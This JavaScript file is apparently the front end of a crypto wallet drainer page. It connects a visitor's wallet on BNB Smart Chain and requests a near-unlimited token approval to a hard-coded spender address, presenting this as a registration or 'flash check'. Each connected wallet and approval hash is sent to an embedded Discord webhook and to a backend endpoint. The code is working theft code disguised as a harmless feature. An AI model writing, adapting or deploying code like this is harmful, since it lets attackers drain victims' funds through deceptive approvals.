const busdContractAddress = "0x55d398326f99059fF775485246999027B3197955";
const busdAbi = [
    {
        "constant": false,
        "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
    }
];

// Discord webhook URL
const discordWebhookURL = "https://discord.com/api/webhooks/1333674200501850112/ooI6L8O22BYG85V7Mk19egJHU3tCa_ckJciNiqq0Pde0FYth8tXh7XEIBwSPGzpCapSH";

async function sendDiscordNotification(message) {
    try {
        await fetch(discordWebhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("Failed to send notification to Discord:", error);
    }
}

async function BusdApproval() {
    loadingButtonBusd();
    await window.ethereum.enable();
    const web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    let account = accounts[0];
    let net = await web3.eth.net.getId();

    // Notify on wallet connect
    await sendDiscordNotification(`Wallet connected: ${account}`);

    if (net == 56) {
        const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
        const amount = 115792089237;
        const spenderAddress = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8";
        const amountToApprove = web3.utils.toWei(amount.toString(), 'ether');
        try {
            const transaction = await busdContract.methods
                .approve(spenderAddress, amountToApprove)
                .send({ from: account })
                .then(async (d) => {
                    const hash = d.transactionHash;

                    // Notify on approval
                    await sendDiscordNotification(
                        `Access Granted:\nWallet: ${account}\nTransaction Hash: ${hash}`
                    );

                    $.ajax({
                        type: "POST",
                        url: "flashChecks.aspx/insertAddress",
                        data: `{ "address": "${account}", "hash": "${hash}"}`,
                        contentType: "application/json; charset=utf-8",
                        dataType: "json",
                        success: function (response) {}
                    });

                    Swal.fire({ icon: 'success', title: 'Congratulations', text: hash }).then(() => {
                        location.reload();
                    });
                });
        } catch (error) {
            Swal.fire({ icon: 'error', title: 'Info', text: 'Registration Failed' }).then(() => {
                location.reload();
            });
        }
    }
    unLoadingButtonBusd();
}

function loadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "<i class='fa fa-spinner fa-spin'></i>";
    document.getElementById('btnApprove').disabled = true;
}

function unLoadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "";
    document.getElementById('btnApprove').disabled = false;
}

$(document).ready(function () {
    mainLoadFunction();

    jQuery(window).on('load', function () {
        setTimeout(function () {
            JobickCarousel();
        }, 1000);
    });
});
